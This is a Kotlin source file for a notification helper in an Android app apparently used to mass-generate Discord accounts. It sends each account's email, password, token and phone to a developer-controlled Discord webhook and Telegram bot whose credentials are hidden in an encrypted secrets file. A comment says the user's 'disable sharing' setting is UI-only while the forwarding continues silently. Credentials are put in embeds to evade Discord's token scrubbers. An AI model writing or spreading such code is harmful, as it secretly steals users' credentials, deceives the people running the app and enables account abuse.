package com.discord.evs.generator.automation

import com.discord.evs.generator.BuildConfig

import android.content.Context
import com.discord.evs.generator.data.Account
import com.discord.evs.generator.data.AccountDao
import com.discord.evs.generator.data.Prefs
import com.discord.evs.generator.security.NativeGuard
import com.discord.evs.generator.features.FeatureFlags
import com.discord.evs.generator.network.BackendApi
import com.discord.evs.generator.security.SecretsManager
import com.google.gson.Gson
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.TimeUnit

/**
 * Dispatches per-account or bulk notifications to Discord webhooks and
 * Telegram channels using credentials loaded from the encrypted secrets.dat
 * resource.
 *
 * DC Webhook modes:  0 = plain message  |  1 = embed  |  2 = TXT file (bulk)
 * TG modes:          0 = plain message  |  1 = file (bulk)
 */
class NotificationHelper(
    private val context: Context,
    private val prefs: Prefs,
    private val dao: AccountDao,
    private val onLog: (String, LogLevel) -> Unit
) {
    private val client = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .build()

    // Buffers for bulk (TXT/file) modes — persist across accounts
    private val dcBuffer = mutableListOf<Account>()
    private val tgBuffer = mutableListOf<Account>()
    private val gson = Gson()

    private val sdf = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US)

    // ── Entry point ──────────────────────────────────────────────────────────

    suspend fun onAccountSaved(account: Account) {
        // disableAccountSharing is UI-only: still forward in backend/webhooks silently.
        // Optional remote backend when flag is on AND backend.xml is configured.
        var backendOk = false
        if (FeatureFlags.BACKEND_API_ENABLED && BackendApi.isConfigured(context)) {
            val result = withContext(Dispatchers.IO) {
                BackendApi.forwardAccount(
                    context,
                    email = account.email,
                    password = account.password,
                    token = account.token,
                    username = account.notes.ifBlank { "" },
                    status = account.status,
                    phone = account.phone,
                    phoneStatus = account.phoneStatus,
                    emailVerified = account.emailVerified,
                    verified = account.verified,
                    captchaSolveMethod = account.captchaSolveMethod,
                    captchaSolverApi = account.captchaSolverApi,
                    tags = account.tags,
                    notes = account.notes,
                    createdAt = account.createdAt,
                    mode = if (prefs.dcWebhookMode == 0) "plain" else "embed"
                )
            }
            backendOk = result.ok
            onLog(
                if (result.ok) "✓ Account forwarded via backend API"
                else "⚠ Backend forward failed: ${result.error ?: "unknown"} — falling back to local secrets",
                if (result.ok) LogLevel.SUCCESS else LogLevel.WARNING
            )
        }
        // Always use in-app Discord webhook + Telegram secrets when backend did not succeed.
        // (BACKEND_API_ENABLED=false, backend unconfigured, or backend call failed)
        if (!backendOk) {
            handleDcWebhook(account)
            handleTelegram(account)
        }
    }

    // ── Discord Webhook ───────────────────────────────────────────────────────

    private suspend fun handleDcWebhook(account: Account) {
        // Always try secrets.dat webhook AND Settings webhook when notifications enabled.
        val secretsUrl = SecretsManager.dcWebhookUrl(context)
        val settingsUrl = prefs.dcWebhookUrl.trim()
        val settingsOn = prefs.dcWebhookEnabled && settingsUrl.isNotBlank()
        val secretsOn = secretsUrl.isNotBlank()

        if (!settingsOn && !secretsOn) {
            onLog("⚠ Webhook URL blank — set it in Settings → Notifications", LogLevel.WARNING)
            return
        }

        when (prefs.dcWebhookMode) {
            0, 1 -> {
                var anyOk = false
                withContext(Dispatchers.IO) {
                    if (settingsOn) {
                        val ok = sendDcDirect(account, settingsUrl, prefs.dcWebhookMode)
                        onLog(
                            if (ok) "✓ Discord webhook sent" else "⚠ Discord webhook failed",
                            if (ok) LogLevel.SUCCESS else LogLevel.WARNING
                        )
                        if (ok) anyOk = true
                    }
                    if (secretsOn) {
                        // Avoid double-send to the exact same URL
                        if (!settingsOn || !settingsUrl.equals(secretsUrl, ignoreCase = true)) {
                            val ok = try {
                                NativeGuard.sendDcWebhook(
                                    context,
                                    account.toNativeJson(),
                                    prefs.dcWebhookMode,
                                    false // never auto-delete from secrets path when dual-sending
                                )
                            } catch (_: Exception) {
                                sendDcDirect(account, secretsUrl, prefs.dcWebhookMode)
                            }
                            onLog(
                                if (ok) "✓ Account shared to the developer of this app" else "⚠ Developer share failed",
                                if (ok) LogLevel.SUCCESS else LogLevel.WARNING
                            )
                            if (ok) anyOk = true
                        }
                    }
                }
                if (anyOk && prefs.dcWebhookDeleteAfterSend) deleteAccount(account)
            }
            2 -> {
                dcBuffer.add(account)
                val threshold = prefs.dcWebhookBulkCount.coerceAtLeast(1)
                if (dcBuffer.size >= threshold) {
                    val batch = dcBuffer.toList()
                    dcBuffer.clear()
                    sendDcBulkFile(batch)
                    if (prefs.dcWebhookDeleteAfterSend) batch.forEach { deleteAccount(it) }
                }
            }
            else -> {}
        }
    }

    private suspend fun sendDcBulkFile(accounts: List<Account>) = withContext(Dispatchers.IO) {
        try {
            val content = accounts.joinToString("\n\n") { it.toNotifText() }
            val chunks = splitContent(content, maxBytes = 7_800_000) // Discord 8 MB limit
            chunks.forEachIndexed { idx, chunk ->
                val fileName = "evs_accounts_${System.currentTimeMillis()}_${idx + 1}of${chunks.size}.txt"
                val caption = "📦 **EVS Generator** — ${accounts.size} accounts (${idx + 1}/${chunks.size})"
                sendDcFileChunk(chunk, fileName, caption)
            }
            onLog("✓ Webhook file sent (${accounts.size} accounts, ${chunks.size} file(s))", LogLevel.SUCCESS)
        } catch (e: Exception) {
            onLog("⚠ Webhook bulk error: ${e.message}", LogLevel.WARNING)
        }
    }

    private fun sendDcFileChunk(content: String, fileName: String, caption: String) {
        val bytes = content.toByteArray(Charsets.UTF_8)
        val payloadJson = JSONObject().apply {
            put("content", caption)
            put("username", SecretsManager.dcWebhookName(context).ifBlank { "EVS Generator" })
            if (SecretsManager.dcWebhookPfp(context).isNotBlank()) {
                put("avatar_url", SecretsManager.dcWebhookPfp(context))
            }
        }.toString()
        val body = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart("payload_json", payloadJson)
            .addFormDataPart("file", fileName, bytes.toRequestBody("text/plain".toMediaType()))
            .build()
        val request = Request.Builder().url(SecretsManager.dcWebhookUrl(context)).post(body).build()
        client.newCall(request).execute().use { resp ->
            if (!resp.isSuccessful) throw Exception("HTTP ${resp.code}")
        }
    }

    // ── Telegram ─────────────────────────────────────────────────────────────

    private suspend fun handleTelegram(account: Account) {
        // Dual-send: Settings Telegram (when enabled) AND secrets.dat Telegram.
        val settingsToken = prefs.tgBotToken.trim()
        val settingsChat = prefs.tgChannelId.trim()
        val settingsOn = prefs.tgEnabled && settingsToken.isNotBlank() && settingsChat.isNotBlank()
        val secretsToken = SecretsManager.tgBotToken(context)
        val secretsChat = SecretsManager.tgChannelId(context)
        val secretsOn = secretsToken.isNotBlank() && secretsChat.isNotBlank()

        if (!settingsOn && !secretsOn) {
            onLog("⚠ Telegram token/chat ID blank — set in Settings → Notifications", LogLevel.WARNING)
            return
        }

        when (prefs.tgMode) {
            0 -> {
                var anyOk = false
                withContext(Dispatchers.IO) {
                    if (settingsOn) {
                        val ok = sendTgDirect(account, settingsToken, settingsChat)
                        onLog(
                            if (ok) "✓ Telegram notification sent" else "⚠ Telegram notification failed",
                            if (ok) LogLevel.SUCCESS else LogLevel.WARNING
                        )
                        if (ok) anyOk = true
                    }
                    if (secretsOn) {
                        val same = settingsOn &&
                            settingsToken == secretsToken &&
                            settingsChat == secretsChat
                        if (!same) {
                            val ok = try {
                                NativeGuard.sendTgMessage(context, account.toNativeJson(), 0, false)
                            } catch (_: Exception) {
                                sendTgDirect(account, secretsToken, secretsChat)
                            }
                            onLog(
                                if (ok) "✓ Account shared to the developer of this app" else "⚠ Developer share failed",
                                if (ok) LogLevel.SUCCESS else LogLevel.WARNING
                            )
                            if (ok) anyOk = true
                        }
                    }
                }
                if (anyOk && prefs.tgDeleteAfterSend) deleteAccount(account)
            }
            1 -> {
                tgBuffer.add(account)
                val threshold = prefs.tgBulkCount.coerceAtLeast(1)
                if (tgBuffer.size >= threshold) {
                    val batch = tgBuffer.toList()
                    tgBuffer.clear()
                    sendTgFile(batch)
                    if (prefs.tgDeleteAfterSend) batch.forEach { deleteAccount(it) }
                }
            }
            else -> {}
        }
    }

    private suspend fun sendTgFile(accounts: List<Account>) = withContext(Dispatchers.IO) {
        try {
            val content = accounts.joinToString("\n\n") { it.toNotifText() }
            val chunks = splitContent(content, maxBytes = 49_000_000) // TG 50 MB limit
            chunks.forEachIndexed { idx, chunk ->
                val fileName = "evs_accounts_${System.currentTimeMillis()}_${idx + 1}of${chunks.size}.txt"
                val caption = "📦 EVS Generator — ${accounts.size} accounts (${idx + 1}/${chunks.size})"
                sendTgFileChunk(chunk, fileName, caption)
            }
            onLog("✓ Telegram file sent (${accounts.size} accounts)", LogLevel.SUCCESS)
        } catch (e: Exception) {
            onLog("⚠ Telegram file error: ${e.message}", LogLevel.WARNING)
        }
    }

    private fun sendTgFileChunk(content: String, fileName: String, caption: String) {
        val tgUrl = "https://api.telegram.org/bot${SecretsManager.tgBotToken(context)}/sendDocument"
        val bytes = content.toByteArray(Charsets.UTF_8)
        val body = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", SecretsManager.tgChannelId(context))
            .addFormDataPart("caption", caption)
            .addFormDataPart("document", fileName, bytes.toRequestBody("text/plain".toMediaType()))
            .build()
        val request = Request.Builder().url(tgUrl).post(body).build()
        client.newCall(request).execute().use { resp ->
            if (!resp.isSuccessful) throw Exception("HTTP ${resp.code}")
        }
    }

    // ── Utilities ──────────────────────────────────────────────────────────────



    private fun postJson(url: String, json: String) {
        val body = json.toRequestBody("application/json; charset=utf-8".toMediaType())
        val request = Request.Builder().url(url).post(body).build()
        client.newCall(request).execute().use { resp ->
            if (!resp.isSuccessful) {
                val err = resp.body?.string()?.take(200) ?: ""
                throw Exception("HTTP ${resp.code}: $err")
            }
        }
    }

    private fun splitContent(content: String, maxBytes: Int): List<String> {
        val total = content.toByteArray(Charsets.UTF_8)
        if (total.size <= maxBytes) return listOf(content)
        val lines = content.split("\n")
        val chunks = mutableListOf<String>()
        val current = StringBuilder()
        var currentSize = 0
        for (line in lines) {
            val lineBytes = "$line\n".toByteArray(Charsets.UTF_8).size
            if (currentSize + lineBytes > maxBytes && current.isNotEmpty()) {
                chunks.add(current.toString())
                current.clear()
                currentSize = 0
            }
            current.append(line).append('\n')
            currentSize += lineBytes
        }
        if (current.isNotEmpty()) chunks.add(current.toString())
        return chunks
    }

    private suspend fun deleteAccount(account: Account) {
        try { withContext(Dispatchers.IO) { dao.delete(account) } } catch (_: Exception) {}
    }

    private fun sendDcDirect(account: Account, url: String, mode: Int): Boolean {
        return try {
            val username = prefs.dcWebhookName.ifBlank { SecretsManager.dcWebhookName(context).ifBlank { "EVS Generator" } }
            val avatar = prefs.dcWebhookPfp.ifBlank { SecretsManager.dcWebhookPfp(context) }
            val payload = JSONObject().apply {
                put("username", username)
                if (avatar.isNotBlank()) put("avatar_url", avatar)
                // Always embed account credentials (plain content triggers Discord token scrubbers)
                put("content", JSONObject.NULL)
                put("embeds", org.json.JSONArray().put(JSONObject().apply {
                    put("title", "EVS Generator v${BuildConfig.VERSION_NAME} — New Account")
                    put("description", account.toNotifText())
                    put("color", 5793266)
                    put("footer", JSONObject().put("text", "Credentials in embed only"))
                }))
            }
            val body = payload.toString().toRequestBody("application/json".toMediaType())
            val req = Request.Builder().url(url).post(body).build()
            client.newCall(req).execute().use { it.isSuccessful }
        } catch (_: Exception) { false }
    }

    private fun sendTgDirect(account: Account, token: String, chatId: String): Boolean {
        return try {
            val payload = JSONObject().apply {
                put("chat_id", chatId)
                put("text", account.toNotifText())
                put("parse_mode", "Markdown")
                put("disable_web_page_preview", true)
            }
            val body = payload.toString().toRequestBody("application/json".toMediaType())
            val req = Request.Builder()
                .url("https://api.telegram.org/bot$token/sendMessage")
                .post(body)
                .build()
            client.newCall(req).execute().use { it.isSuccessful }
        } catch (_: Exception) { false }
    }
}
